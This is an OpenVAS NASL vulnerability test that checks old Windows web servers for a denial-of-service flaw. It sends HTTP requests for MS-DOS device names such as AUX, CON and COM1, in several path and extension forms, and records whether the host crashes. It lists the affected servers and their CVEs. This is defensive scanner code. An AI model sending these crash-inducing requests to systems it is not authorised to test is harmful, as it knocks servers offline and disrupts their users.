# OpenVAS Vulnerability Test
# Description: HTTP Windows 98 MS/DOS device names DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added links to the Bugtraq message archive, Microsoft Knowledgebase,
# and known vulnerable servers list
#
# Copyright:
# Copyright (C) 2001 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10930");
  script_version("2019-04-13T13:01:50+0000");
  script_tag(name:"last_modification", value:"2019-04-13 13:01:50 +0000 (Sat, 13 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1043, 2575, 2608, 2622, 2649, 2704, 3929, 6659, 6662);
  script_cve_id("CVE-2001-0386", "CVE-2001-0493", "CVE-2001-0391", "CVE-2001-0558", "CVE-2002-0200",
                "CVE-2000-0168", "CVE-2003-0016", "CVE-2001-0602", "CVE-2003-0421", "CVE-2003-0502");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("HTTP Windows 98 MS/DOS device names DOS");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2001 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_windows");

  script_tag(name:"solution", value:"Upgrade the system or use a
  HTTP server that filters those names out.");

  script_tag(name:"summary", value:"It was possible to freeze or reboot Windows by
  reading a MS/DOS device through HTTP, using a file name like CON\CON, AUX.htm or AUX.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your
  system crash continuously, preventing you from working properly.");

  script_tag(name:"affected", value:"Known vulnerable servers:

  vWebServer v1.2.0 (and others?)

  AnalogX SimpleServer:WWW 1.08 (CVE-2001-0386)

  Small HTTP server 2.03 (CVE-2001-0493)

  acWEB HTTP server?

  Xitami Web Server (BID:2622, CVE-2001-0391)

  Jana Web Server (BID:2704, CVE-2001-0558)

  Cyberstop Web Server (BID:3929, CVE-2002-0200)

  General Windows MS-DOS Device (BID:1043, CVE-2000-0168)

  Apache < 2.0.44 (CVE-2003-0016)

  Domino 5.0.7 and earlier (CVE-2001-0602, BID: 2575)

  Darwin Streaming Server v4.1.3e (CVE-2003-0421)

  Darwin Streaming Server v4.1.3f (CVE-2003-0502)");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

i = 0;
ext[i++] = ".htm"; # Should we add .html ?
ext[i++] = ".";
ext[i++] = ". . .. ... .. .";
ext[i++] = ".asp";
ext[i++] = ".foo";
ext[i++] = ".bat";
# Special meanings
ext[i++] = "-"; # /../ prefix
ext[i++] = "+"; # /aux/aux pattern

port = get_http_port(default:80);
if (http_is_dead(port: port))
  exit (0);

n = 0;
for (i = 0; dev[i]; i++) {
  d = dev[i];
  for (j = 0; ext[j]; j++) {
    e = ext[j];
    if (e == "+")
      name = string("/", d, "/", d);
    else if (e == "-")
      name = string("/../", d); # Kills Darwin Streaming Server v4.1.3f and earlier (Win32 only)
    else
      name = string("/", d, e);

    req = http_get(item:name, port:port);
    soc = http_open_socket(port);
    if(soc) {
      send(socket:soc, data:req);
      http_recv(socket:soc);
      http_close_socket(soc);
    }
  }
}

alive = end_denial();
if(!alive) {
  security_message(port:port);
  set_kb_item( name:"Host/dead", value:TRUE );
  exit(0);
}

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);